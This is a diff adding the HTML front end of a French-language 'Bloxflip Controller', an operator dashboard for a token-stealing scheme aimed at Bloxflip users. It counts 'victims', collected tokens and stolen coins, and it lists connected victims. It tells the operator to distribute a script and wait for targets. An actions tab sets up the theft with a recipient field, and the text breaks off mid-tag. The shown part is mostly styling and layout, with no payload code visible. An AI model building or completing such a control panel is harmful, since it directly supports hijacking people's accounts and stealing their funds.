@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bloxflip Controller</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+        .container { max-width: 900px; width: 100%; }
+        
+        /* Stats bar */
+        .stats-bar {
+            display: flex; gap: 15px; margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 10px;
+            padding: 15px 20px; flex: 1; min-width: 120px; text-align: center;
+        }
+        .stat-number { font-size: 28px; font-weight: 700; color: #7cff7c; font-family: monospace; }
+        .stat-label { font-size: 11px; color: #8888aa; text-transform: uppercase; margin-top: 4px; }
+        
+        .panel {
+            background: #1a1a2e; border: 1px solid #2a2a4a;
+            border-radius: 12px; padding: 25px; margin-bottom: 20px;
+        }
+        .panel-title { color: #f7c948; font-size: 18px; font-weight: 600; margin-bottom: 15px; }
+        
+        /* Victime cards */
+        .victim-card {
+            background: #0f0f1a; border: 1px solid #2a2a4a;
+            border-radius: 8px; padding: 15px; margin-bottom: 10px;
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 10px;
+        }
+        .victim-card:hover { border-color: #ff6b35; }
+        .victim-info { flex: 1; min-width: 200px; }
+        .victim-name { color: #f7c948; font-weight: 600; font-size: 15px; }
+        .victim-tokens { font-size: 11px; color: #888; margin-top: 4px; word-break: break-all; }
+        .victim-tokens code { color: #7cff7c; background: #0a0a1a; padding: 1px 5px; border-radius: 3px; }
+        .victim-actions { display: flex; gap: 6px; flex-wrap: wrap; }
+        .btn {
+            padding: 8px 16px; border: none; border-radius: 6px;
+            font-weight: 600; font-size: 12px; cursor: pointer;
+            color: white; transition: opacity 0.2s;
+        }
+        .btn:hover { opacity: 0.85; }
+        .btn-orange { background: linear-gradient(135deg,#ff6b35,#e85d30); }
+        .btn-red { background: linear-gradient(135deg,#e74c3c,#c0392b); }
+        .btn-gray { background: #2a2a4a; color: #ccc; }
+        .btn-green { background: linear-gradient(135deg,#27ae60,#1e8449); }
+        .btn-small { padding: 5px 12px; font-size: 11px; }
+        
+        .input-group { margin: 8px 0; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+        .input-group label { color: #8888aa; font-size: 12px; min-width: 80px; }
+        input, select {
+            background: #0f0f1a; border: 1px solid #2a2a4a; border-radius: 6px;
+            padding: 8px 10px; color: #e0e0e0; font-size: 13px; outline: none;
+            flex: 1; min-width: 100px;
+        }
+        input:focus, select:focus { border-color: #ff6b35; }
+        
+        .result-box {
+            margin-top: 10px; padding: 10px; border-radius: 6px;
+            font-size: 13px; display: none;
+        }
+        .result-box.success { display: block; background: #0a2a0a; border: 1px solid #2a5a2a; color: #7cff7c; }
+        .result-box.error { display: block; background: #2a0a0a; border: 1px solid #5a2a2a; color: #ff6b6b; }
+        .result-box.info { display: block; background: #0a1a2a; border: 1px solid #2a4a5a; color: #88aaff; }
+
+        .log-box {
+            background: #0f0f1a; border: 1px solid #2a2a4a;
+            border-radius: 8px; padding: 12px; max-height: 200px;
+            overflow-y: auto; font-family: monospace; font-size: 11px;
+        }
+        .log-box div { padding: 3px 0; border-bottom: 1px solid #1a1a2e; }
+        .log-success { color: #7cff7c; }
+        .log-error { color: #ff6b6b; }
+        .log-info { color: #88aaff; }
+
+        .webhook-config {
+            display: flex; gap: 8px; margin-bottom: 15px;
+        }
+        .webhook-config input { flex: 1; }
+        
+        .tab-bar { display: flex; gap: 2px; margin-bottom: 0; }
+        .tab {
+            padding: 10px 20px; background: #1a1a2e; border: 1px solid #2a2a4a;
+            border-bottom: none; border-radius: 8px 8px 0 0; cursor: pointer;
+            font-size: 13px; color: #8888aa;
+        }
+        .tab.active { background: #0f0f1a; color: #f7c948; border-color: #ff6b35; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .footer { text-align: center; color: #555577; font-size: 12px; margin-top: 20px; }
+        .empty-state { color: #555; font-style: italic; text-align: center; padding: 30px; }
+        .status-dot {
+            display: inline-block; width: 8px; height: 8px;
+            border-radius: 50%; margin-right: 6px;
+        }
+        .status-dot.online { background: #7cff7c; }
+        .status-dot.offline { background: #ff6b6b; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="background:linear-gradient(135deg,#ff6b35,#f7c948);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:28px;margin-bottom:5px;">🎯 Bloxflip Controller</h1>
+        <p style="color:#8888aa;margin-bottom:20px;">Réception des tokens + contrôle à distance</p>
+
+        <!-- Stats -->
+        <div class="stats-bar" id="statsBar">
+            <div class="stat-card">
+                <div class="stat-number" id="statVictims">0</div>
+                <div class="stat-label">Victimes</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statTokens">0</div>
+                <div class="stat-label">Tokens collectés</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statRocoins" style="color:#f7c948;">0</div>
+                <div class="stat-label">Volés (ROCOINS)</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statFlipcoins" style="color:#f7c948;">0</div>
+                <div class="stat-label">Volés (FLIPCOINS)</div>
+            </div>
+        </div>
+
+        <!-- Onglets -->
+        <div class="tab-bar">
+            <div class="tab active" onclick="switchTab('victims')">👥 Victimes</div>
+            <div class="tab" onclick="switchTab('actions')">🎮 Actions</div>
+            <div class="tab" onclick="switchTab('config')">⚙️ Config</div>
+            <div class="tab" onclick="switchTab('logs')">📜 Logs</div>
+        </div>
+
+        <!-- Tab: Victimes -->
+        <div id="tab-victims" class="panel tab-content active" style="border-radius:0 12px 12px 12px;margin-top:0;">
+            <div class="panel-title">👥 Victimes connectées</div>
+            <div id="victimsContainer">
+                <div class="empty-state">🔴 Aucune victime pour l'instant.<br>Distribue le script et attends qu'elles aillent sur Bloxflip.</div>
+            </div>
+        </div>
+
+        <!-- Tab: Actions -->
+        <div id="tab-actions" class="panel tab-content" style="border-radius:0 12px 12px 12px;margin-top:0;">
+            <div class="panel-title">🎮 Actions rapides</div>
+            
+            <div style="margin-bottom:15px;">
+                <div style="color:#8888aa;font-size:12px;text-transform:uppercase;margin-bottom:6px;">1. Choisir une victime</div>
+                <select id="actionVictim" style="width:100%;">
+                    <option value="">— Aucune victime disponible —</option>
+                </select>
+            </div>
+
+            <div style="margin-bottom:15px;">
+                <div style="color:#8888aa;font-size:12px;text-transform:uppercase;margin-bottom:6px;">2. Configurer le vol</div>
+                <div class="input-group">
+                    <label>Destinataire</label>
+                    <input type="text" i
